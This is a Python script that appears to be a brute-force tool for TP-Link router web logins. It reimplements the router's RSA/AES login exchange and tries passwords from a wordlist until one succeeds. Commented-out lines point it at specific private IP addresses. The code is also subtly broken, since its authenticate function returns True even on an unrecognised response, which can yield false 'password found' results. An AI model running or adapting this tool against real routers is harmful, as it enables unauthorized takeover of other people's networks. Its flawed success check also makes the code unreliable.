import requests
import re
import typing
import hashlib
import base64
import sys
from colors import colors
import tp_link_crypto


DEBUG: bool = False
VERBOSE: bool = False
USERNAME: str = "admin"  # Hardcoded in the router
USER_AGENT: str = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0"
AES_KEY: str = "A" * 16
AES_IV: str = "B" * 16

def print_d(msg: str) -> None:
    if DEBUG:
        print(msg)
def print_v(msg: str) -> None:
    if VERBOSE:
        print(msg)


def get_rsa_public_key(s: requests.Session, ip_addr: str) -> typing.Union[typing.Tuple[int, int, int], None]:
    """
    Requests the public key and sequence from the router.
    :param s: The active HTTP session with the router.
    :param ip_addr: The router's IP address
    :return: A tuple of RSA e and n values with the sequence number on success, otherwise None
    """
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Origin": f"http://{ip_addr}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip_addr}",
        "Accept-Language": "en-US,en;q=0.5",
    }
    data = "[/cgi/getParm#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n"
    resp = s.post(f"http://{ip_addr}/cgi?8", headers=headers, data=data)
    print_d(f"{colors['Blue']}[*] {resp.headers}{colors['Color_Off']}")
    print_d(f"{colors['Blue']}[*] {resp.text}{colors['Color_Off']}")

    # Get the RSA public key (i.e. n and e values)
    match = re.search("nn=\"(.+)\"", resp.text)
    if not match:
        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find RSA n value in get RSA public key response{colors['Color_Off']}")
        return None
    n_bytes = match.group(1)
    print_v(f"{colors['Green']}[+] {colors['Yellow']}RSA n: {colors['Cyan']}{n_bytes}{colors['Color_Off']}")
    match = re.search("ee=\"(.+)\"", resp.text)
    if not match:
        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find RSA e value in get RSA public key response{colors['Color_Off']}")
        return None
    e_bytes = match.group(1)
    print_v(f"{colors['Green']}[+] {colors['Yellow']}RSA e: {colors['Cyan']}{e_bytes}{colors['Color_Off']}")

    # Get the sequence. This is set to sequence += data_len and verified server-side.
    match = re.search("seq=\"(.+)\"", resp.text)
    if not match:
        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find seq value in get RSA public key response{colors['Color_Off']}")
        return None
    seq_bytes = match.group(1)
    print_v(f"{colors['Green']}[+] {colors['Yellow']}Sequence: {seq_bytes}{colors['Color_Off']}")

    e = int(e_bytes, 16)
    n = int(n_bytes, 16)
    seq = int(seq_bytes, 10)

    return e, n, seq


def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
    """
    Authenticates with the TP-Link router.
    :param s: The active requests session
    :param ip_addr: The router's IP address
    :param password: The password to the router's web server
    :return: True on success, otherwise False
    """
    # Get the RSA public key parameters and the sequence
    rsa_vals = get_rsa_public_key(s, ip_addr)
    if rsa_vals is None:
        print(f"{colors['Red']}[-] {colors['Yellow']}Failed to get RSA public key and sequence values{colors['Color_Off']}")
        return False
    e, n, seq = rsa_vals

    # Create the data field
    aes_key = AES_KEY.encode("utf-8")
    aes_iv = AES_IV.encode("utf-8")
    login_data: str = f"8\r\n[/cgi/login#0,0,0,0,0,0#0,0,0,0,0,0]0,2\r\nusername={USERNAME}\r\npassword={password}\r\n"
    data_ciphertext = tp_link_crypto.aes_encrypt(aes_key, aes_iv, login_data.encode())
    data = base64.b64encode(data_ciphertext).decode()
    # print_d(login_data)

    # Create the sign field
    seq_with_data_len = seq + len(data)
    auth_hash = hashlib.md5(f"{USERNAME}{password}".encode()).digest()
    # The string __must__ be null terminated, otherwise strlen gets the wrong size
    # print(f"[*] Setting AES key to {AES_KEY}")
    # print(f"[*] Setting AES IV to {AES_IV}")
    plaintext = f"key={AES_KEY}&iv={AES_IV}&h={auth_hash.hex()}&s={seq_with_data_len}\x00\r\n"
    sign = tp_link_crypto.rsa_encrypt(e, n, plaintext.encode())
    # print_d(plaintext)

    # Send the authentication request
    headers = {
        "User-Agent": USER_AGENT,
        "Content-Type": "text/plain",
        "Accept": "*/*",
        "Origin": f"http://{ip_addr}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip_addr}/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    request_data = f"sign={sign.hex()}\r\ndata={data}\r\n"
    try:
        resp = s.post(f"http://{ip_addr}/cgi_gdpr", headers=headers, data=request_data)
    except:
        print(f"{colors['Red']}[-] {colors['Yellow']}GDPR endpoint error.{colors['Color_Off']}")
        return False

    # Get the session cookie
    cookie = resp.headers["Set-Cookie"]
    if cookie is None:
        print(f"{colors['Red']}[-] {colors['Yellow']}Login response did not include a Set-Cookie field in the header{colors['Color_Off']}")
        return False
    # Example of the cookie field:
    # ```
    # JSESSIONID=fc1e35a7a860e860be66d44bc7b34e; Path=/; HttpOnly
    # ```
    # Get the JSESSIONID field because it's used during other requests.
    match = re.search(r"JSESSIONID=([a-z0-9]+)", cookie)
    if not match:
        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find the JSESSIONID in the Set-Cookie filed of the login response{colors['Color_Off']}")
        return False
    jsessionid = match.group(1)
    print_v(f"{colors['Green']}[+] {colors['Yellow']}JSESSIONID: {colors['Cyan']}{jsessionid}{colors['Color_Off']}")

    # Decode the Base64 encoded response
    decoded: bytes = base64.b64decode(resp.text)
    decrypted_resp = tp_link_crypto.aes_decrypt(aes_key, aes_iv, decoded)

    # Remove the PKCS #7 padding
    num_padding_bytes = int(decrypted_resp[-1])
    decrypted_resp = decrypted_resp[:-num_padding_bytes]

    decrypted_resp_str: str = decrypted_resp.decode()
    # print_d(decrypted_resp_str)
    if "[cgi]0" in decrypted_resp_str and "$.ret=0" in decrypted_resp_str and "[error]0" in decrypted_resp_str:
        # get ssid and password also wan PPPoE username and password
        return True

    else:
        # This might not be an error because other routers may have different response codes. The Archer C20 returns:
        # ```
        # [cgi]0
        # $.ret=0;
        # [error]0
        # ```
        print(f"{colors['Red']}[-] {colors['Yellow']}Unknown response message from router{colors['Color_Off']}")
        print(decrypted_resp_str)

    return True


def tp_bruter(ip_addr: str, passList: list) -> int:
    print(f"{colors['Blue']}[*]{colors['Color_Off']} Starting brute force attack on {colors['Blue']}TP-Link router{colors['Color_Off']}")
    s = requests.Session()
    for count, password in enumerate(passList):
        success = authenticate(s, ip_addr, password)
        if not success:
            print(f"{colors['Red']}[-]{colors['Yellow']} Failed '{colors['Purple']}{password}{colors['Color_Off']}'")
            print(f"{colors['Blue']}[*] {colors['Yellow']}Progress: {colors['Blue']}{(count/len(passList))*100}% ({colors['Green']}{count}/{colors['Cyan']}{len(passList)}){colors['Color_Off']}")
        else:
            print(f"{colors['Green']}[+] Password found! '{colors['Purple']}{password}{colors['Color_Off']}'")
            return password
    s.close()
    return False
def is_tplink(ip_addr: str) -> bool:
    try:
        s = requests.Session()
        resp = s.get(f"http://{ip_addr}/", timeout=5)
        s.close()
        if "TP-LINK" in resp.text:
            return True
        return False
    except:
        return False
 
# authenticate(requests.Session(), "10.106.27.80:8080", "password1")
# passFile = open("common.txt", "r")
# passList = [passwd.strip() for passwd in passFile]
# tp_bruter("10.106.22.201:8080", passList)